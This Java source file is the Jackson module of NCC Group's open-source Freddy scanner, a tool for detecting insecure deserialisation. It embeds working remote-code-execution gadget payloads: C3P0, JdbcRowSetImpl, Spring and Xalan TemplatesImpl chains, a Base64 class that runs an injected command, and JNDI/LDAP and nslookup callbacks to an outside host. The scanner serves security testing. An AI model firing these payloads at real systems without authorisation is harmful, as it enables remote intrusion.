// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java Jackson library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JacksonModule extends FreddyModuleBase {
    //Time-based payload delay
    private static final int TIME_DELAY = 18000;

    //C3P0RefDataSource payload data
    private static final String C3P0REF_PREFIX = "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"";
    private static final String C3P0REF_SUFFIX = "\",\"loginTimeout\":0}]";

    //C3P0WrapperConnPool payload data
    private static final String C3P0WRAP_PREFIX = "[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",{\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064672656464797400c8";
    private static final String C3P0WRAP_SUFFIX = "740003466f6f;\"}]";

    //JdbcRowSet payload data
    private static final String JDBC_PREFIX = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"";
    private static final String JDBC_SUFFIX = "\",\"autoCommit\":true}]";

    //SpringAbstractBeanFactory payload data
    private static final String SABF_PREFIX = "[\"java.util.HashSet\",[[\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",{\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"";
    private static final String SABF_MIDDLE = "\"]}],\"adviceBeanName\":\"";
    private static final String SABF_SUFFIX = "\"}],[\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",{}]]]";

    //SpringPropertyPathFactory data
    private static final String SPPF_PREFIX = "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"";
    private static final String SPPF_MIDDLE = "\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"";
    private static final String SPPF_SUFFIX = "\"]}]}]";

    //Xalan TemplatesImpl payload data
    private static final String TIMPL_PREFIX = "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"";
    private static final String TIMPL_SUFFIX = "\"],\"transletName\":\"a.b\",\"outputProperties\":{}}]";
    private static final String TIMPL_INNER_PREFIX_B64 = "yv66vgAAADQAJQoABwATCgAUABUIABYKABQAFwoAGAAZBwAaBwAbAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHABwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKU291cmNlRmlsZQEAEktydWVnZXJLb2ZmZWUuamF2YQwACAAJBwAdDAAeAB8BAMg=";
    private static final String TIMPL_INNER_SUFFIX_B64 = "DAAgACEHACIMACMAJAEADUtydWVnZXJLb2ZmZWUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkAIQAGAAcAAAAAAAMAAQAIAAkAAgAKAAAAMQACAAEAAAARKrcAAbgAAhIDtgAEtgAFV7EAAAABAAsAAAAOAAMAAAACAAQAAwAQAAQADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAIAAEADgAQAAEACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAMAAEAEQAAAAIAEg==";
    private static final int TIMPL_PAYLOAD_CMD_OFFSET = 443;
    private byte[] TIMPL_INNER_PAYLOAD;

    protected void initialiseModule() {
        setName("Jackson");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        TIMPL_INNER_PAYLOAD = buildBinaryPayloadBuffer(TIMPL_INNER_PREFIX_B64, TIMPL_INNER_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("com\\.fasterxml\\.jackson\\."), Pattern.compile("exception", Pattern.CASE_INSENSITIVE)}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("[\"\"]", Pattern.compile("Invalid type id ((')|(&#39;))((')|(&#39;))"));

        registerActiveScanTimeBasedPayload(TIMPL_PREFIX + generateBase64BinaryPayload(TIMPL_INNER_PAYLOAD, TIMPL_PAYLOAD_CMD_OFFSET, "cmd /c ping -n 21 127.0.0.1", false) + TIMPL_SUFFIX, TIME_DELAY);
        registerActiveScanTimeBasedPayload(TIMPL_PREFIX + generateBase64BinaryPayload(TIMPL_INNER_PAYLOAD, TIMPL_PAYLOAD_CMD_OFFSET, "ping -c 21 127.0.0.1", false) + TIMPL_SUFFIX, TIME_DELAY);

        registerActiveScanCollaboratorPayload(PN_C3P0RDS, false);
        registerActiveScanCollaboratorPayload(PN_C3P0WCP, false);
        registerActiveScanCollaboratorPayload(PN_JDBC, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, false);
        registerActiveScanCollaboratorPayload(PN_TEMPLATES, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0RDS:
                return C3P0REF_PREFIX + "ldap://" + hostname + "/" + C3P0REF_SUFFIX;

            case PN_C3P0WCP:
                return C3P0WRAP_PREFIX + encodeStringToAsciiHex(padString("http://" + hostname + "/", 200)) + C3P0WRAP_SUFFIX;

            case PN_JDBC:
                return JDBC_PREFIX + "ldap://" + hostname + "/" + JDBC_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_SPRINGPPF:
                return SPPF_PREFIX + "ldap://" + hostname + "/" + SPPF_MIDDLE + "ldap://" + hostname + "/" + SPPF_SUFFIX;

            case PN_TEMPLATES:
                return TIMPL_PREFIX + generateBase64BinaryPayload(TIMPL_INNER_PAYLOAD, TIMPL_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false) + TIMPL_SUFFIX;
        }
        return null;
    }
}
